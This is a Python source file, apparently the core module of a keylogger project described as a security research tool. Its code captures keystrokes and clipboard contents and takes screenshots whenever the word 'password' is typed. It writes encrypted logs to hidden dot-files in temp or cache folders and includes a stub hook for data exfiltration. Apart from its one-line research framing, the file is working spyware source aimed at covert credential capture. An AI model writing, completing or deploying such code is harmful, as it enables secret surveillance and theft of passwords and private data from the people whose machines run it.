"""
Keylogger Core Module

Main keylogger class that orchestrates input capture, logging, and exfiltration.
"""

import os
import sys
import json
import logging
import threading
import signal
from datetime import datetime
from pathlib import Path
from typing import Optional, Callable, Dict, Any

from capture import InputCapture
from encrypt import LogEncryptor


class Keylogger:
    """
    Keylogger for security research and detection training.
    
    This class orchestrates keyboard input capture, secure logging,
    and optional data exfiltration.
    """
    
    def __init__(
        self,
        log_file: Optional[str] = None,
        encrypt_logs: bool = True,
        encryption_key: Optional[str] = None,
        exfil_enabled: bool = False,
        exfil_config: Optional[Dict[str, Any]] = None,
        log_clipboard: bool = True,
        log_screenshots: bool = False,
        screenshot_trigger: str = "password",
        debug: bool = False
    ):
        """
        Initialize the keylogger.
        
        Args:
            log_file: Path to log file (default: hidden temp directory)
            encrypt_logs: Enable log encryption (default: True)
            encryption_key: Custom encryption key (default: generated)
            exfil_enabled: Enable data exfiltration (default: False)
            exfil_config: Exfiltration configuration dict
            log_clipboard: Monitor clipboard changes
            log_screenshots: Capture screenshots on triggers
            screenshot_trigger: Keyword that triggers screenshot
            debug: Enable debug logging
        """
        self.running = False
        self.debug = debug
        
        # Setup logging
        log_level = logging.DEBUG if debug else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger("Keylogger")
        
        # Determine log file location
        if log_file:
            self.log_file = Path(log_file)
        else:
            # Default to hidden temp directory
            self.log_file = self._get_default_log_path()
        
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        
        # Initialize components
        self.encryptor = LogEncryptor(encryption_key) if encrypt_logs else None
        self.capture = InputCapture(
            callback=self._on_key_event,
            log_clipboard=log_clipboard,
            clipboard_callback=self._on_clipboard_change,
            debug=debug
        )
        
        # Exfiltration settings
        self.exfil_enabled = exfil_enabled
        self.exfil_config = exfil_config or {}
        
        # Screenshot settings
        self.log_screenshots = log_screenshots
        self.screenshot_trigger = screenshot_trigger.lower()
        
        # Statistics
        self.stats = {
            "keys_captured": 0,
            "clipboard_changes": 0,
            "screenshots_taken": 0,
            "start_time": None,
            "end_time": None
        }
        
        # Threads
        self._threads = []
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        self.logger.info(f"Keylogger initialized. Log file: {self.log_file}")
    
    def _get_default_log_path(self) -> Path:
        """Get default hidden log file path."""
        if sys.platform == 'win32':
            base = Path(os.environ.get('TEMP', ''))
        elif sys.platform == 'darwin':
            base = Path.home() / 'Library' / 'Caches'
        else:  # Linux
            base = Path('/tmp')
        
        base.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        return base / f'.kl_{timestamp}.log'
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals."""
        self.logger.info(f"Received signal {signum}, shutting down...")
        self.stop()
    
    def _on_key_event(self, key_info: Dict[str, Any]):
        """
        Callback for keyboard events.
        
        Args:
            key_info: Dict containing key information
        """
        self.stats["keys_captured"] += 1
        
        # Format log entry
        timestamp = datetime.now().isoformat()
        entry = {
            "timestamp": timestamp,
            "type": "keypress",
            "data": key_info
        }
        
        # Check for screenshot trigger
        if self.log_screenshots:
            key_value = key_info.get('key', '').lower()
            if self.screenshot_trigger in key_value:
                self._take_screenshot()
        
        # Write to log
        self._write_log(entry)
        
        if self.debug:
            self.logger.debug(f"Key captured: {key_info}")
    
    def _on_clipboard_change(self, content: str):
        """
        Callback for clipboard changes.
        
        Args:
            content: New clipboard content
        """
        self.stats["clipboard_changes"] += 1
        
        timestamp = datetime.now().isoformat()
        entry = {
            "timestamp": timestamp,
            "type": "clipboard",
            "data": {"content": content[:500]}  # Limit length
        }
        
        self._write_log(entry)
        self.logger.debug("Clipboard change captured")
    
    def _take_screenshot(self):
        """Capture a screenshot."""
        try:
            # Import here to avoid dependency if not used
            import pyautogui
            
            self.stats["screenshots_taken"] += 1
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            # Save screenshot
            screenshot_dir = self.log_file.parent / 'screenshots'
            screenshot_dir.mkdir(exist_ok=True)
            screenshot_path = screenshot_dir / f'screenshot_{timestamp}.png'
            
            screenshot = pyautogui.screenshot()
            screenshot.save(str(screenshot_path))
            
            # Log the screenshot event
            entry = {
                "timestamp": datetime.now().isoformat(),
                "type": "screenshot",
                "data": {"path": str(screenshot_path)}
            }
            self._write_log(entry)
            
            self.logger.info(f"Screenshot saved: {screenshot_path}")
            
        except ImportError:
            self.logger.warning("pyautogui not installed. Install with: pip install pyautogui")
        except Exception as e:
            self.logger.error(f"Screenshot failed: {e}")
    
    def _write_log(self, entry: Dict[str, Any]):
        """
        Write entry to log file.
        
        Args:
            entry: Log entry dict
        """
        try:
            json_line = json.dumps(entry) + '\n'
            
            if self.encryptor:
                json_line = self.encryptor.encrypt(json_line)
            
            with open(self.log_file, 'a') as f:
                f.write(json_line)
                
        except Exception as e:
            self.logger.error(f"Failed to write log: {e}")
    
    def start(self):
        """Start the keylogger."""
        if self.running:
            self.logger.warning("Keylogger already running")
            return
        
        self.running = True
        self.stats["start_time"] = datetime.now().isoformat()
        
        self.logger.info("Starting keylogger...")
        
        # Start input capture
        capture_thread = threading.Thread(target=self.capture.start, daemon=True)
        capture_thread.start()
        self._threads.append(capture_thread)
        
        # Start exfiltration if enabled
        if self.exfil_enabled:
            self._start_exfiltration()
        
        self.logger.info("Keylogger started successfully")
    
    def stop(self):
        """Stop the keylogger."""
        if not self.running:
            return
        
        self.running = False
        self.stats["end_time"] = datetime.now().isoformat()
        
        self.logger.info("Stopping keylogger...")
        
        # Stop capture
        self.capture.stop()
        
        # Wait for threads
        for thread in self._threads:
            thread.join(timeout=2)
        
        # Save statistics
        self._save_stats()
        
        self.logger.info(f"Keylogger stopped. Total keys captured: {self.stats['keys_captured']}")
        self.logger.info(f"Log file: {self.log_file}")
    
    def _start_exfiltration(self):
        """Start data exfiltration thread."""
        # Placeholder for exfiltration logic
        self.logger.warning("Exfiltration not yet implemented")
    
    def _save_stats(self):
        """Save statistics to file."""
        stats_file = self.log_file.parent / f'.kl_stats_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        try:
            with open(stats_file, 'w') as f:
                json.dump(self.stats, f, indent=2)
            self.logger.debug(f"Stats saved to: {stats_file}")
        except Exception as e:
            self.logger.error(f"Failed to save stats: {e}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current statistics."""
        return self.stats.copy()
    
    def is_running(self) -> bool:
        """Check if keylogger is running."""
        return self.running


def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Keylogger - Security Research Tool"
    )
    
    parser.add_argument(
        '-o', '--output',
        type=str,
        help='Output log file path'
    )
    parser.add_argument(
        '-e', '--encrypt',
        action='store_true',
        default=True,
        help='Encrypt logs (default: True)'
    )
    parser.add_argument(
        '--no-encrypt',
        action='store_false',
        dest='encrypt',
        help='Disable log encryption'
    )
    parser.add_argument(
        '-k', '--key',
        type=str,
        help='Custom encryption key'
    )
    parser.add_argument(
        '-c', '--clipboard',
        action='store_true',
        help='Log clipboard changes'
    )
    parser.add_argument(
        '-s', '--screenshots',
        action='store_true',
        help='Capture screenshots on trigger keywords'
    )
    parser.add_argument(
        '-t', '--trigger',
        type=str,
        default='password',
        help='Keyword trigger for screenshots (default: password)'
    )
    parser.add_argument(
        '-d', '--debug',
        action='store_true',
        help='Enable debug logging'
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  Keylogger - Security Research Tool")
    print("=" * 60)
    
    keylogger = Keylogger(
        log_file=args.output,
        encrypt_logs=args.encrypt,
        encryption_key=args.key,
        log_clipboard=args.clipboard,
        log_screenshots=args.screenshots,
        screenshot_trigger=args.trigger,
        debug=args.debug
    )
    
    try:
        keylogger.start()
        
        # Keep running
        while keylogger.is_running():
            threading.Event().wait(1)
            
    except KeyboardInterrupt:
        print("\nStopping...")
    finally:
        keylogger.stop()
        stats = keylogger.get_stats()
        print(f"\nSession complete:")
        print(f"  Keys captured: {stats['keys_captured']}")
        print(f"  Clipboard changes: {stats['clipboard_changes']}")
        print(f"  Screenshots: {stats['screenshots_taken']}")
        print(f"  Log file: {keylogger.log_file}")


if __name__ == "__main__":
    main()
